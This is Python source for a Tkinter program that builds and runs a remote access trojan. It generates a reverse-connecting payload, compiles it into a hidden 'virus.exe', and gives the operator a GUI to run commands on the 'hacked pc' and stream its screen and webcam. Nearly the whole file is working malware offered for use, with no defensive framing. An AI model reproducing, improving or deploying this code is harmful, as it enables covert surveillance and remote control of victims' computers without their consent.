from  tkinter import *
from tkinter.messagebox import showerror, showinfo
import os
import shutil
import threading
import socket
import cv2
import struct
import pickle
from functools import partial

x = 100
y = 200



vert = "#006D00"
gray = "#2D2E2B"
white = "#ffffff"
black = "#000000"
red = "#FF0000"
screen = Tk()
screen.title("TGS")
screen.geometry("1920x1080")
screen.config(bg="#2D2E2B")
screen.iconbitmap("icon.ico")

boxgenerate = Frame(screen, bg="#2D2E2B", border=0, width=1920, height=980)
boxsystem = Frame(screen, bg="#2D2E2B", border=0, width=1920, height=980)


tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

tcpsock.bind(("", 9786))




        

####################################################################################################################################################################################

def help_ip():
    showinfo(title="IP ADDRESS", message="Open a cmd and enter the command : 'ipconfig' and take the IPV4 address")




def GenerateWindow():
    
    
    boxsystem.destroy()
    boxgenerate = Frame(screen, bg="#2D2E2B", border=0, width=1920, height=980)
    entry_ip = Entry(boxgenerate, width=30, bd=0, bg=white, fg=black, font=("Impact", 30), justify=CENTER)
    label_ip = Label(boxgenerate, text="YOUR PC's IP ADDRESS", font=("Impact", 30), bg=white, bd=0)
    button_help = Button(boxgenerate, bg=vert, font=("Impact", 20), fg="#ffffff", text="FIND YOUR IP ADDRESS", bd=0, command=help_ip)
    entry_path = Entry(boxgenerate, width=50, bd=0, bg=white, fg=black, font=("Impact", 30), justify=CENTER)
    label_path = Label(boxgenerate, text="PATH TO CREATE THE VIRUS", font=("Impact", 30), bg=white, bd=0)
    
    def generate():
        ip = entry_ip.get()
        path = entry_path.get()
        
        scrypt = f"ip = '{ip}'\nimport socket\nimport os\nimport cv2\nimport struct\nimport pickle\nfrom PIL import ImageGrab\nimport numpy as np\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((ip, 9786))\nlaunched = True\n\nwhile launched:\n    command = s.recv(2048)\n    command = command.decode('UTF8')\n    phrase = command.split()\n\n\n    if command == 'test':\n        data = 'Ordinateur hacke est bien en connexion'\n        data = data.encode('UTF8')\n        s.send(data)\n    if phrase[0] == 'cmd':\n        command = phrase[1]\n        if command != '':\n            os.system(command)\n\n    if phrase[0] == 'opencmd':\n        number = int(phrase[1])\n        for i in range(number):\n            os.system('start')\n\n    if command == 'screen_stream':\n        times = 'no'\n        while True:\n            times = s.recv(2048).decode('UTF8')\n            if times == 'yes':\n                img = ImageGrab.grab(bbox=(0, 0, 1920, 1080))\n                img_np = np.array(img)\n                frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)\n                a = pickle.dumps(frame)\n                message = struct.pack('Q', len(a)) + a\n                s.send(message)\n            if times == 'stop':\n                break\n            times = 'no'\n\n\n    if command == 'cam_stream':\n        times = 'no'\n        vid = cv2.VideoCapture(0)\n        while True:\n            times = s.recv(2048)\n            times = times.decode('UTF8')\n            if times == 'yes':\n                img, frame = vid.read()\n                a = pickle.dumps(frame)\n                message = struct.pack('Q', len(a)) + a\n                s.send(message)\n            if times == 'stop':\n                break\n            times = 'no'\n"

        if not os.path.exists("tempo"):
            os.makedirs("tempo")
        
        with open(f"tempo/virus.py", "w") as file:
            file.write(scrypt)
        
        os.system(f"pyinstaller --onefile -w --icon=icon.ico tempo/virus.py")
        shutil.copy("dist/virus.exe", f"{path}/")
        shutil.rmtree("tempo")
        shutil.rmtree("dist")
        shutil.rmtree("build")
        os.remove("virus.spec")
        
        
        showinfo(title="SUCCESS", message="Virus created with success")
    
    
    button_generate = Button(boxgenerate, bg=vert, font=("Bold", 20), fg="#ffffff", text="GENERATE", bd=0, command=generate)
    label_path.place(x=760, y=350)
    entry_path.place(x=430, y=400)
    button_help.place(x=830, y=550)
    label_ip.place(x=780, y=650)
    entry_ip.place(x=650, y=700)
    button_generate.place(x=880, y=820)
    boxgenerate.place(x=0, y=100)

####################################################################################################################################################################################

hacked = []



class ClientThread(threading.Thread):

    def __init__(self, ip, port, clientsocket):

        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.clientsocket = clientsocket
        
        
        
            
def test(clientsocket):
    
    try:
        clientsocket.send("test".encode("UTF8"))
        reponse = clientsocket.recv(2048)
        reponse = reponse.decode("UTF8")
        showinfo(title="SUCCESS", message="The connection is good with the pc.")
    except:
        showerror(title="LOST")

def screen_stream(clientsocket):
    stream_screen = True
    clientsocket.send("screen_stream".encode("UTF8"))
    data = b""
    payload_size = struct.calcsize("Q")
    while stream_screen:
        while len(data) < payload_size:
            clientsocket.send("yes".encode("UTF8"))
            packet = clientsocket.recv(2*2048)
            data += packet
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size) [0]
            while len(data) < msg_size:
                data += clientsocket.recv(4*1024)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow("Received", frame)
            if cv2.waitKey(25) & 0xFF == ord('q'):
                cv2.destroyAllWindows()
                clientsocket.send("stop".encode("UTF8"))
                stream_screen =  False
                break



def cam_stream(clientsocket):
    print("cam_stream a commencer")
    stream_cam = True
    clientsocket.send("cam_stream".encode('UTF8'))
    data = b""
    payload_size = struct.calcsize("Q")
    while stream_cam:
        while len(data) < payload_size:
            clientsocket.send("yes".encode("UTF8"))
            packet = clientsocket.recv(4*1024)
            data += packet
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size) [0]
            while len(data) < msg_size:
                data += clientsocket.recv(4*1024)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow("Received", frame)
            if cv2.waitKey(25) & 0xFF == ord('q'):
                cv2.destroyAllWindows()
                stream_cam = False
                clientsocket.send("stop".encode("UTF8"))
                break


def SystemWindow():
    boxgenerate.destroy()
    boxsystem = Frame(screen, bg="#2D2E2B", border=0, width=1920, height=980)
    
    
    def Refresh_Research():
        button_refresh = Button(boxsystem, text="REFRESH", font=("Calibri", 30), bd=0, fg=white, bg=red)
        button_refresh.place(x=880, y=500)
        tcpsock.listen(10)
        (clientsocket, (ip, port)) = tcpsock.accept()
        newthread = ClientThread(ip, port, clientsocket)
        boxsystem.destroy()
        boxhack = Frame(screen, bg="#2D2E2B", border=0, width=1920, height=980)
        button_cam = Button(boxhack, text="CAM STREAM", font=("Calibri", 30), bd=0, fg=white, bg=vert, command=lambda: cam_stream(clientsocket))
        button_screen = Button(boxhack, text="SCREEN STREAM", font=("Calibri", 30), bd=0, fg=white, bg=vert, command=lambda: screen_stream(clientsocket))
        button_test = Button(boxhack, text="TEST", font=("Calibri", 30), bd=0, fg=white, bg=vert, command=lambda: test(clientsocket))
        cam_label = Label(boxhack, text="retransmit the camera of the hacked pc", font=("Impact", 30), fg=white, bg=gray)
        screen_label = Label(boxhack, text="retransmit the screen of the hacked pc", font=("Impact", 30), fg=white, bg=gray)
        test_label = Label(boxhack, text="Test the connection", font=("Impact", 30), fg=white, bg=gray)
        
        test_label.place(x=400, y=418)
        button_test.place(x=10, y=400)
        button_cam.place(x=10, y=200)
        cam_label.place(x=400, y=218)
        button_screen.place(x=10, y=300)
        screen_label.place(x=400, y=318)
        boxhack.place(x=0, y=100)
        
    thread_reasearch = threading.Thread(target=Refresh_Research)
    
    
    
    button_refresh = Button(boxsystem, text="REFRESH", font=("Calibri", 30), bd=0, fg=white, bg=vert, command=thread_reasearch.start)
    button_refresh.place(x=880, y=500)
    boxsystem.place(x=0, y=100)
    





############################################################################################################################

boxleft = Frame(screen, bg=vert, border=0, width=955, height=100)
boxright = Frame(screen, bg=vert, border=0, width=955, height=100)

buttonright = Button(boxleft, bg=vert, font=("Bold", 40), fg="#ffffff", text="GENERATE", bd=0, width=30, command=GenerateWindow)
buttonleft = Button(boxright, bg=vert, font=("Bold", 40), fg="#ffffff", text="SYSTEM", bd=0, width=31, command=SystemWindow)

buttonright.pack(expand=YES)
buttonleft.pack(expand=YES)


boxleft.place(x=0, y=0)
boxright.place(x=965, y=0)
screen.mainloop()
